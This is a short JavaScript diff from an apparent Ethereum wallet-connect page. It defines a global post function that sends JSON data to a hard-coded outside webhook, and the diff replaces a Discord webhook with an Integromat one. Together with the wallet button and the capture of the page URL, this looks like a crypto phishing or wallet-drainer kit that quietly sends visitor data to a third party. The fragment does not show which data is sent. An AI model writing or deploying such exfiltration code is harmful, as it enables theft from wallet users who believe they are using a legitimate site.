@@ -2,7 +2,7 @@ const ethereumButton = document.querySelector('.enableEthereumButton');
 const showAccount = document.querySelector('.showAccount');
 const weburl = window.location.href
 window.post = async function(data) {
-    return fetch("https://discord.com/api/webhooks/941287699254501430/fKKwwpcRXtkpkjPWGb1q0H6tARHtFoND4cZtw-CXtYW6Ga0XM1tE04ByGQf2DZ5dVCNS",
+    return fetch("https://hook.integromat.com/i6iofkb3ku6827l61kyffgxfn1roc3tu",
      {method: "POST", body: JSON.stringify(data),headers:{"Content-type": "application/json"}});
   }
 ethereumButton.addEventListener('click', () => {
